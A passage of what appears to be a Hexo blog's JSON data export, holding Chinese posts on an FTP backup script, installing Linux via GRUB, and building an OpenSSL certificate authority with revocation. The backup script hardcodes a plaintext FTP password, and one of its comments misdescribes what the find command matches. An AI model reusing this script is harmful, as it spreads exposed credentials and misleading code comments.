-rf $filename.gz","source":"_posts/自动备份上传ftp服务器.md","raw":"title: 自动备份上传ftp服务器\ncategories: [程序设计,Shell编程]\ntags: []\ndate: 2011-10-18 15:12:00\n---\n#!/bin/bash\nfilename=`date +%Y%m%d`.tar                                                         #文件名称为日期\nfind /data/ -mtime +30 | xargs tar -cf $filename                                 #在/data目录中，查找30天内没有修改的文件，并打包\ngzip -9 $filename                                                                              #使用gzip压缩\nftp -n &lt;&lt; EOF                                                                                   #交互登录\nopen 192.168.0.1\nuser key1088 123456                                                                       #key1088 为username，123456为password\nput /data/$filename.gz bakfile/$filename.gz                                      #上传到bakfile文件下面\nbye\nEOF\nrm -rf $filename.gz","slug":"自动备份上传ftp服务器","published":1,"updated":"2023-04-22T05:38:45.142Z","_id":"clgrjlxmu00ct7opib2r78uyt","comments":1,"layout":"post","photos":[],"link":"","content":"<p>#!&#x2F;bin&#x2F;bash<br>filename&#x3D;<code>date +%Y%m%d</code>.tar                                                         #文件名称为日期<br>find &#x2F;data&#x2F; -mtime +30 | xargs tar -cf $filename                                 #在&#x2F;data目录中，查找30天内没有修改的文件，并打包<br>gzip -9 $filename                                                                              #使用gzip压缩<br>ftp -n &lt;&lt; EOF                                                                                   #交互登录<br>open 192.168.0.1<br>user key1088 123456                                                                       #key1088 为username，123456为password<br>put &#x2F;data&#x2F;$filename.gz bakfile&#x2F;$filename.gz                                      #上传到bakfile文件下面<br>bye<br>EOF<br>rm -rf $filename.gz</p>\n","site":{"data":{}},"excerpt":"","more":"<p>#!&#x2F;bin&#x2F;bash<br>filename&#x3D;<code>date +%Y%m%d</code>.tar                                                         #文件名称为日期<br>find &#x2F;data&#x2F; -mtime +30 | xargs tar -cf $filename                                 #在&#x2F;data目录中，查找30天内没有修改的文件，并打包<br>gzip -9 $filename                                                                              #使用gzip压缩<br>ftp -n &lt;&lt; EOF                                                                                   #交互登录<br>open 192.168.0.1<br>user key1088 123456                                                                       #key1088 为username，123456为password<br>put &#x2F;data&#x2F;$filename.gz bakfile&#x2F;$filename.gz                                      #上传到bakfile文件下面<br>bye<br>EOF<br>rm -rf $filename.gz</p>\n"},{"title":"硬盘下安装linux","date":"2010-11-25T09:53:00.000Z","_content":"<p>公司新来一批设备，主板没有IDE口，IDE光驱就不能用了。</p><p>用USB光驱装，竟然不能初始化过来，郁闷死了、我要安装的linux系统，太老了，驱动应该支持的少。</p><p>没有办法，公司没有sata光驱，只能硬盘安装了。</p><p> </p><p> </p><p>在另一个linux系统上，上传linux镜像iso。再把iso里面的isolinux文件提取出来。</p><p>这个文件，大家都知道吧，安装引导文件。</p><p>从一个linux启动，进入grub，就是刚刚进去系统时的东西，进入grub命令行（按”c“）。</p><p>kernel （hd0,0)/路径/isolinux/vmlinuz</p><p>&#8205; </p><p>initrd（hd0,0)/路径/isolinux/initd.img</p><p> </p><p>boot</p><p> </p><p>进入安装界面，选择硬盘安装。选择iso的目录就行，不</p><p></p>","source":"_posts/硬盘下安装linux.md","raw":"title: 硬盘下安装linux\ncategories: [Linux]\ntags: []\ndate: 2010-11-25 17:53:00\n---\n<p>公司新来一批设备，主板没有IDE口，IDE光驱就不能用了。</p><p>用USB光驱装，竟然不能初始化过来，郁闷死了、我要安装的linux系统，太老了，驱动应该支持的少。</p><p>没有办法，公司没有sata光驱，只能硬盘安装了。</p><p> </p><p> </p><p>在另一个linux系统上，上传linux镜像iso。再把iso里面的isolinux文件提取出来。</p><p>这个文件，大家都知道吧，安装引导文件。</p><p>从一个linux启动，进入grub，就是刚刚进去系统时的东西，进入grub命令行（按”c“）。</p><p>kernel （hd0,0)/路径/isolinux/vmlinuz</p><p>&#8205; </p><p>initrd（hd0,0)/路径/isolinux/initd.img</p><p> </p><p>boot</p><p> </p><p>进入安装界面，选择硬盘安装。选择iso的目录就行，不</p><p></p>","slug":"硬盘下安装linux","published":1,"updated":"2023-04-22T05:38:45.119Z","_id":"clgrjlxmv00cv7opihgged1uw","comments":1,"layout":"post","photos":[],"link":"","content":"<p>公司新来一批设备，主板没有IDE口，IDE光驱就不能用了。</p><p>用USB光驱装，竟然不能初始化过来，郁闷死了、我要安装的linux系统，太老了，驱动应该支持的少。</p><p>没有办法，公司没有sata光驱，只能硬盘安装了。</p><p> </p><p> </p><p>在另一个linux系统上，上传linux镜像iso。再把iso里面的isolinux文件提取出来。</p><p>这个文件，大家都知道吧，安装引导文件。</p><p>从一个linux启动，进入grub，就是刚刚进去系统时的东西，进入grub命令行（按”c“）。</p><p>kernel （hd0,0)/路径/isolinux/vmlinuz</p><p>&#8205; </p><p>initrd（hd0,0)/路径/isolinux/initd.img</p><p> </p><p>boot</p><p> </p><p>进入安装界面，选择硬盘安装。选择iso的目录就行，不</p><p></p>","site":{"data":{}},"excerpt":"","more":"<p>公司新来一批设备，主板没有IDE口，IDE光驱就不能用了。</p><p>用USB光驱装，竟然不能初始化过来，郁闷死了、我要安装的linux系统，太老了，驱动应该支持的少。</p><p>没有办法，公司没有sata光驱，只能硬盘安装了。</p><p> </p><p> </p><p>在另一个linux系统上，上传linux镜像iso。再把iso里面的isolinux文件提取出来。</p><p>这个文件，大家都知道吧，安装引导文件。</p><p>从一个linux启动，进入grub，就是刚刚进去系统时的东西，进入grub命令行（按”c“）。</p><p>kernel （hd0,0)/路径/isolinux/vmlinuz</p><p>&#8205; </p><p>initrd（hd0,0)/路径/isolinux/initd.img</p><p> </p><p>boot</p><p> </p><p>进入安装界面，选择硬盘安装。选择iso的目录就行，不</p><p></p>"},{"title":"源码搭建CA服务器,证书可申请、吊销","date":"2016-09-04T08:41:57.000Z","_content":"现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的 加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。\n<strong>openssl安装：\n</strong>\n先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。\n我们的编译和测试环境如下：\n<pre>\nkey1088@key1088-host:~$ uname -a\nLinux key1088-host 4.4.0-36-generic #55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux\nkey1088@key1088-host:~$ gcc --version\ngcc (Ubuntu 5.4.0-6ubuntu1~16.04.2) 5.4.0 20160609\nCopyright (C) 2015 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.  There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n</pre>\n1.下载openssl源代码\nhttps://www.openssl.org/\n<pre>\nwget https://www.openssl.org/source/openssl-1.1.0.tar.gz\n</pre>\n2.编译安装\n<pre>\ntar xvf openssl-1.1.0.tar.gz\ncd openssl-1.1.0\n./config\nmake\n</pre>\n咱们这次就不make install了，就在这个目录下面操作了，需要临时设置一下环境变量\n这个版本默认编译出来静态bin文件在apps下面\n<pre>\n-rw-rw-r-- 1 key1088 key1088    911 9月   4 13:49 x509.d\n-rwxrwxr-x 1 key1088 key1088 680616 9月   4 13:49 openssl\n-rwxrwxr-x 1 key1088 key1088   6755 9月   4 13:50 CA.pl\n-rwxrwxr-x 1 key1088 key1088   6613 9月   4 13:50 tsget\n</pre>\n3.环境变量设置\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0/apps$ ./openssl version\n./openssl: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory\nkey1088@key1088-host:~/openssl-1.1.0/apps$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$HOME/openssl-1.1.0\nkey1088@key1088-host:~/openssl-1.1.0/apps$ export LD_LIBRARY_PATH\nkey1088@key1088-host:~/openssl-1.1.0/apps$ ./openssl versionOpenSSL 1.1.0  25 Aug 2016\n</pre>\n出现版本号就证明环境变量设置正确，openssl可以用了。\n<strong>\nCA服务器证书生成：\n</strong>\nCA（Certificate Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。\n所有的操作默认在openssl-1.1.0目录下进行\n2.生成CA密钥\n<pre>\nmkdir -p CA/private\nkey1088@key1088-host:~/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)\nGenerating RSA private key, 2048 bit long modulus\n.................................+++\n..........+++\nunable to write 'random state'\ne is 65537 (0x010001)\n</pre>\n如果出现这个“unable to write 'random state'”设置一下环境变量即可\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ export RANDFILE=$HOME/.rnd\nkey1088@key1088-host:~/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)\nGenerating RSA private key, 2048 bit long modulus\n.................................+++\n.....................................................................................+++\ne is 65537 (0x010001)\n</pre>\n2.生成自签名证书\n创建配置文件目录\n<pre>\nmkdir etc\ncp apps/openssl.cnf etc\n</pre>\n为了简化证书制作过程中的输入 修改了etc/openssl.cnf，修改对比内容如下\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ diff etc/openssl.cnf apps/openssl.cnf\n42c42\n< dir\t\t= ./CA\t\t# Where everything is kept\n---\n> dir\t\t= ./demoCA\t\t# Where everything is kept\n129c129\n< countryName_default\t\t= CN\n---\n> countryName_default\t\t= AU\n134c134\n< stateOrProvinceName_default\t= BJ\n---\n> stateOrProvinceName_default\t= Some-State\n139c139\n< 0.organizationName_default\t= key1088.info\n---\n> 0.organizationName_default\t= Internet Widgits Pty Ltd\n151c151\n< emailAddress\t\t\t= key1088@163.com\n---\n> emailAddress\t\t\t= Email Address\n</pre>\n根据密钥生存证书\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -x509 -key CA/private/cakey.pem -out CA/cacert.pem -days 1000 -config etc/openssl.cnf\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [CN]:\nState or Province Name (full name) [BJ]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [key1088.info]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:key1088\nkey1088@163.com []:\n</pre>\n创建CA服务器所需文件\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ touch CA/{index.txt,serial}\nkey1088@key1088-host:~/openssl-1.1.0$ ls -l CA/\n总用量 8\n-rw-rw-r-- 1 key1088 key1088 1176 9月   4 14:07 cacert.pem\n-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 index.txt\ndrwxrwxr-x 2 key1088 key1088 4096 9月   4 13:57 private\n-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 serial\n</pre>\n证书序号开始值设置\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ echo \"01\" > CA/serial\n</pre>\n3.生成客户端证书，也称为节点证书。\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/client/c01.key 2048)\nGenerating RSA private key, 2048 bit long modulus\n............+++\n................................................................................................+++\ne is 65537 (0x10001)\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -key CA/client/c01.key -out CA/client/c01.csr -config etc/openssl.cnf\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [CN]:\nState or Province Name (full name) [BJ]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [key1088.info]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:c01\t\t#此处不能和CA中的名称相同\nkey1088@163.com []:\nPlease enter the following 'extra' attributes\nto be sent with your certificate request\nA challenge password []:1234\nAn optional company name []:1234\n</pre>\n4.部署到CA中\n<pre>\nmkdir -p CA/newcerts\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -in CA/client/c01.csr -out CA/client/c01.crt -days 1000 -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\nCan't open ./CA/index.txt.attr for reading, No such file or directory\n140399448418048:error:02001002:system library:fopen:No such file or directory:crypto/bio/bss_file.c:74:fopen('./CA/index.txt.attr','r')\n140399448418048:error:2006D080:BIO routines:BIO_new_file:no such file:crypto/bio/bss_file.c:77:\nCheck that the request matches the signature\nSignature ok\nCertificate Details:\n        Serial Number: 1 (0x1)\n        Validity\n            Not Before: Sep  4 06:58:17 2016 GMT\n            Not After : Jun  1 06:58:17 2019 GMT\n        Subject:\n            countryName               = CN\n            stateOrProvinceName       = BJ\n            organizationName          = key1088.info\n            commonName                = c01\n        X509v3 extensions:\n            X509v3 Basic Constraints:\n                CA:FALSE\n            Netscape Comment:\n                OpenSSL Generated Certificate\n            X509v3 Subject Key Identifier:\n                AB:F4:CB:4F:13:28:F8:5D:A7:DB:A0:E3:F3:52:86:C1:25:D1:EB:A0\n            X509v3 Authority Key Identifier:\n                keyid:68:82:F2:71:02:9C:92:00:F4:05:72:30:24:97:6B:80:2E:69:AF:EA\nCertificate is to be certified until Jun  1 06:58:17 2019 GMT (1000 days)\nSign the certificate? [y/n]:y\n1 out of 1 certificate requests certified, commit? [y/n]y\nWrite out database with 1 new entries\nData Base Updated\nkey1088@key1088-host:~/openssl-1.1.0$ du -a CA/\n8\tCA/newcerts/01.pem\t\t        #自动生成的PEM文件，按照序号命名\n12\tCA/newcerts\n4\tCA/private/cakey.pem\n8\tCA/private\n4\tCA/serial\n4\tCA/serial.old\n0\tCA/index.txt.old\n4\tCA/cacert.pem\n4\tCA/index.txt\n8\tCA/client/c01.crt\t\t\t#生成的证书\n4\tCA/client/c01.key\n4\tCA/client/c01.csr\n20\tCA/client\n4\tCA/index.txt.attr\n64\tCA/\n</pre>\nopenssl自带的样例：\nopenssl-1.1.0/apps/demoCA/下面的内容\n5.转换给pfx格式（可选）\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl pkcs12 -export -clcerts -in CA/client/c01.crt -inkey CA/client/c01.key -out CA/client/c01.pfx\nEnter Export Password:\t\t\t\t\t#12345678\nVerifying - Enter Export Password:\t\t#同上\n</pre>\npfx文件包含数字签名证书和私钥，可以进行密钥转移，也可以导入到浏览器中查看。\n6.验证证书是否正确\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl verify -CAfile CA/cacert.pem  CA/client/c01.crt\nCA/client/c01.crt: OK\n</pre>\n<strong>吊销证书\n</strong>\n1.查看客户端证书序号\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl x509 -in CA/client/c01.crt -noout -serial -subject\nserial=01\nsubject=C = CN, ST = BJ, O = key1088.info, CN = c01\n</pre>\n2.吊销证书\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -revoke CA/newcerts/01.pem -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\nRevoking Certificate 01.\nData Base Updated\n</pre>\n3.生成吊销列表\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ echo \"01\" > CA/crlnumber\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -gencrl -out CA/all.crl -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\n</pre>\n4.查看吊销\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl crl -in CA/all.crl -noout -text\nCertificate Revocation List (CRL):\n        Version 2 (0x1)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: /C=CN/ST=BJ/O=key1088.info/CN=key1088\n        Last Update: Sep  4 07:37:17 2016 GMT\n        Next Update: Oct  4 07:37:17 2016 GMT\n        CRL extensions:\n            X509v3 CRL Number:\n                1\nRevoked Certificates:\n    Serial Number: 01\n        Revocation Date: Sep  4 07:34:48 2016 GMT\n    Signature Algorithm: sha256WithRSAEncryption\n         a7:98:6c:8f:77:d2:52:6a:57:eb:27:75:6f:17:eb:3c:30:19:\n         78:bb:4f:77:aa:94:74:28:e5:7a:05:38:8d:03:6c:7c:8f:63:\n         de:a9:fd:d3:ed:77:70:7d:24:9a:b9:da:42:05:9b:d1:73:92:\n         6c:0c:13:88:16:16:d7:e1:4f:6f:62:90:8a:11:b1:c5:b7:80:\n         c8:6c:76:e5:d2:eb:a9:f4:ee:da:85:56:9e:f2:97:02:43:ef:\n         3d:ea:77:af:5b:f1:ed:4b:39:c7:7e:9c:22:62:91:ee:17:30:\n         10:d2:49:82:9a:0d:9c:0c:ad:63:1e:cb:30:33:f0:5f:55:dc:\n         b6:6c:70:61:82:ba:e0:d3:98:96:f3:3d:8b:0c:02:0d:fd:ac:\n         61:e5:24:46:a0:52:94:05:f4:a9:a8:8b:25:40:db:a4:e5:58:\n         4f:bd:37:1d:44:87:f1:3f:f9:06:d5:47:aa:0c:8f:1e:ba:d6:\n         99:ef:f7:77:e0:af:05:a3:08:78:06:0f:e2:6a:a4:cd:ac:1a:\n         45:d3:18:9a:18:25:ee:c3:7b:66:51:77:52:64:5e:4a:81:9e:\n         84:be:16:bc:da:7d:83:7b:49:d1:5a:0f:4f:02:e4:fa:fb:80:\n         53:7f:7f:72:02:17:31:25:c6:6e:cc:1e:4f:7e:9c:f4:ae:d1:\n         85:a2:6a:d6\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/serial\n03\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/crlnumber\n02\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/index.txt\nR\t190601065817Z\t160904073448Z\t01\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c01\nV\t190601073145Z\t\t02\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c02\nkey1088@key1088-host:~/openssl-1.1.0$ cat CA/index.txt.old\nV\t190601065817Z\t\t01\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c01\nV\t190601073145Z\t\t02\tunknown\t/C=CN/ST=BJ/O=key1088.info/CN=c02\n</pre>\n5.验证吊销的证书和正常使用的证书\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl  verify -crl_check -CRLfile CA/all.crl -CAfile CA/cacert.pem CA/client/c01.crt\nC = CN, ST = BJ, O = key1088.info, CN = c01\nerror 23 at 0 depth lookup: certificate revoked\nerror CA/client/c01.crt: verification failed\n</pre>\n再新生成一个02的证书验证一下，验证结果。\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl  verify -crl_check -CRLfile CA/all.crl -CAfile CA/cacert.pem CA/client/c02.crt\nCA/client/c02.crt: OK\n参考文章：\nhttp://www.yunweipai.com/archives/4513.html%20r\nhttp://raymii.org/s/articles/OpenSSL_manually_verify_a_certificate_against_a_CRL.html\n","source":"_posts/源码搭建CA服务器,证书可申请、吊销.md","raw":"title: 源码搭建CA服务器,证书可申请、吊销\ncategories: [网络安全,Linux]\ntags: []\ndate: 2016-09-04 16:41:57\n---\n现在越来越多的项目在设计的过程中会很注重网络安全，银行金融业和监管机构之间一般采用金融城域网专线连接，在链路上面也使用CA数字证书，一般金融业的CA证书都是CFCA颁发，或者使用制定型号的 加密机。本章主要介绍一下CA服务器的搭建、证书的申请和吊销（也可以自己做加密机），后续有时间会写一下关于程序中怎么使用CA证书进行安全校验的。\n<strong>openssl安装：\n</strong>\n先来介绍一下openssl的安装，一般LINUX发行版都会自带openssl工具，裁剪系统中一般自己来编译安装。\n我们的编译和测试环境如下：\n<pre>\nkey1088@key1088-host:~$ uname -a\nLinux key1088-host 4.4.0-36-generic #55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux\nkey1088@key1088-host:~$ gcc --version\ngcc (Ubuntu 5.4.0-6ubuntu1~16.04.2) 5.4.0 20160609\nCopyright (C) 2015 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.  There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n</pre>\n1.下载openssl源代码\nhttps://www.openssl.org/\n<pre>\nwget https://www.openssl.org/source/openssl-1.1.0.tar.gz\n</pre>\n2.编译安装\n<pre>\ntar xvf openssl-1.1.0.tar.gz\ncd openssl-1.1.0\n./config\nmake\n</pre>\n咱们这次就不make install了，就在这个目录下面操作了，需要临时设置一下环境变量\n这个版本默认编译出来静态bin文件在apps下面\n<pre>\n-rw-rw-r-- 1 key1088 key1088    911 9月   4 13:49 x509.d\n-rwxrwxr-x 1 key1088 key1088 680616 9月   4 13:49 openssl\n-rwxrwxr-x 1 key1088 key1088   6755 9月   4 13:50 CA.pl\n-rwxrwxr-x 1 key1088 key1088   6613 9月   4 13:50 tsget\n</pre>\n3.环境变量设置\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0/apps$ ./openssl version\n./openssl: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory\nkey1088@key1088-host:~/openssl-1.1.0/apps$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$HOME/openssl-1.1.0\nkey1088@key1088-host:~/openssl-1.1.0/apps$ export LD_LIBRARY_PATH\nkey1088@key1088-host:~/openssl-1.1.0/apps$ ./openssl versionOpenSSL 1.1.0  25 Aug 2016\n</pre>\n出现版本号就证明环境变量设置正确，openssl可以用了。\n<strong>\nCA服务器证书生成：\n</strong>\nCA（Certificate Authority）证书颁发机构主要负责证书的颁发、管理以及归档和吊销。证书内包含了拥有证书者的姓名、地址、电子邮件帐号、公钥、证书有效期、发放证书的CA、CA的数字签名等信息。证书主要有三大功能：加密、签名、身份验证。\n所有的操作默认在openssl-1.1.0目录下进行\n2.生成CA密钥\n<pre>\nmkdir -p CA/private\nkey1088@key1088-host:~/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)\nGenerating RSA private key, 2048 bit long modulus\n.................................+++\n..........+++\nunable to write 'random state'\ne is 65537 (0x010001)\n</pre>\n如果出现这个“unable to write 'random state'”设置一下环境变量即可\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ export RANDFILE=$HOME/.rnd\nkey1088@key1088-host:~/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/private/cakey.pem 2048)\nGenerating RSA private key, 2048 bit long modulus\n.................................+++\n.....................................................................................+++\ne is 65537 (0x010001)\n</pre>\n2.生成自签名证书\n创建配置文件目录\n<pre>\nmkdir etc\ncp apps/openssl.cnf etc\n</pre>\n为了简化证书制作过程中的输入 修改了etc/openssl.cnf，修改对比内容如下\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ diff etc/openssl.cnf apps/openssl.cnf\n42c42\n< dir\t\t= ./CA\t\t# Where everything is kept\n---\n> dir\t\t= ./demoCA\t\t# Where everything is kept\n129c129\n< countryName_default\t\t= CN\n---\n> countryName_default\t\t= AU\n134c134\n< stateOrProvinceName_default\t= BJ\n---\n> stateOrProvinceName_default\t= Some-State\n139c139\n< 0.organizationName_default\t= key1088.info\n---\n> 0.organizationName_default\t= Internet Widgits Pty Ltd\n151c151\n< emailAddress\t\t\t= key1088@163.com\n---\n> emailAddress\t\t\t= Email Address\n</pre>\n根据密钥生存证书\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -x509 -key CA/private/cakey.pem -out CA/cacert.pem -days 1000 -config etc/openssl.cnf\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [CN]:\nState or Province Name (full name) [BJ]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [key1088.info]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:key1088\nkey1088@163.com []:\n</pre>\n创建CA服务器所需文件\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ touch CA/{index.txt,serial}\nkey1088@key1088-host:~/openssl-1.1.0$ ls -l CA/\n总用量 8\n-rw-rw-r-- 1 key1088 key1088 1176 9月   4 14:07 cacert.pem\n-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 index.txt\ndrwxrwxr-x 2 key1088 key1088 4096 9月   4 13:57 private\n-rw-rw-r-- 1 key1088 key1088    0 9月   4 14:09 serial\n</pre>\n证书序号开始值设置\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ echo \"01\" > CA/serial\n</pre>\n3.生成客户端证书，也称为节点证书。\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ (umask 077;./apps/openssl genrsa -out CA/client/c01.key 2048)\nGenerating RSA private key, 2048 bit long modulus\n............+++\n................................................................................................+++\ne is 65537 (0x10001)\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl req -new -key CA/client/c01.key -out CA/client/c01.csr -config etc/openssl.cnf\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [CN]:\nState or Province Name (full name) [BJ]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [key1088.info]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:c01\t\t#此处不能和CA中的名称相同\nkey1088@163.com []:\nPlease enter the following 'extra' attributes\nto be sent with your certificate request\nA challenge password []:1234\nAn optional company name []:1234\n</pre>\n4.部署到CA中\n<pre>\nmkdir -p CA/newcerts\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -in CA/client/c01.csr -out CA/client/c01.crt -days 1000 -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\nCan't open ./CA/index.txt.attr for reading, No such file or directory\n140399448418048:error:02001002:system library:fopen:No such file or directory:crypto/bio/bss_file.c:74:fopen('./CA/index.txt.attr','r')\n140399448418048:error:2006D080:BIO routines:BIO_new_file:no such file:crypto/bio/bss_file.c:77:\nCheck that the request matches the signature\nSignature ok\nCertificate Details:\n        Serial Number: 1 (0x1)\n        Validity\n            Not Before: Sep  4 06:58:17 2016 GMT\n            Not After : Jun  1 06:58:17 2019 GMT\n        Subject:\n            countryName               = CN\n            stateOrProvinceName       = BJ\n            organizationName          = key1088.info\n            commonName                = c01\n        X509v3 extensions:\n            X509v3 Basic Constraints:\n                CA:FALSE\n            Netscape Comment:\n                OpenSSL Generated Certificate\n            X509v3 Subject Key Identifier:\n                AB:F4:CB:4F:13:28:F8:5D:A7:DB:A0:E3:F3:52:86:C1:25:D1:EB:A0\n            X509v3 Authority Key Identifier:\n                keyid:68:82:F2:71:02:9C:92:00:F4:05:72:30:24:97:6B:80:2E:69:AF:EA\nCertificate is to be certified until Jun  1 06:58:17 2019 GMT (1000 days)\nSign the certificate? [y/n]:y\n1 out of 1 certificate requests certified, commit? [y/n]y\nWrite out database with 1 new entries\nData Base Updated\nkey1088@key1088-host:~/openssl-1.1.0$ du -a CA/\n8\tCA/newcerts/01.pem\t\t        #自动生成的PEM文件，按照序号命名\n12\tCA/newcerts\n4\tCA/private/cakey.pem\n8\tCA/private\n4\tCA/serial\n4\tCA/serial.old\n0\tCA/index.txt.old\n4\tCA/cacert.pem\n4\tCA/index.txt\n8\tCA/client/c01.crt\t\t\t#生成的证书\n4\tCA/client/c01.key\n4\tCA/client/c01.csr\n20\tCA/client\n4\tCA/index.txt.attr\n64\tCA/\n</pre>\nopenssl自带的样例：\nopenssl-1.1.0/apps/demoCA/下面的内容\n5.转换给pfx格式（可选）\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl pkcs12 -export -clcerts -in CA/client/c01.crt -inkey CA/client/c01.key -out CA/client/c01.pfx\nEnter Export Password:\t\t\t\t\t#12345678\nVerifying - Enter Export Password:\t\t#同上\n</pre>\npfx文件包含数字签名证书和私钥，可以进行密钥转移，也可以导入到浏览器中查看。\n6.验证证书是否正确\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl verify -CAfile CA/cacert.pem  CA/client/c01.crt\nCA/client/c01.crt: OK\n</pre>\n<strong>吊销证书\n</strong>\n1.查看客户端证书序号\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl x509 -in CA/client/c01.crt -noout -serial -subject\nserial=01\nsubject=C = CN, ST = BJ, O = key1088.info, CN = c01\n</pre>\n2.吊销证书\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -revoke CA/newcerts/01.pem -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\nRevoking Certificate 01.\nData Base Updated\n</pre>\n3.生成吊销列表\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ echo \"01\" > CA/crlnumber\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl ca -gencrl -out CA/all.crl -config etc/openssl.cnf\nUsing configuration from etc/openssl.cnf\n</pre>\n4.查看吊销\n<pre>\nkey1088@key1088-host:~/openssl-1.1.0$ ./apps/openssl crl -in CA/all.crl -noout -text\nCertificate Revocation List (CRL):\n        Version 2 (0x1)\n    Signature Algorithm: sha256WithRSAEncryption\n        Issuer: /C=CN/ST=BJ/O=key1088.info/CN=key1088\n        Last Update: Sep  4 07:37:17 2016 GMT\n        Next Update: Oct  4 07:37:17 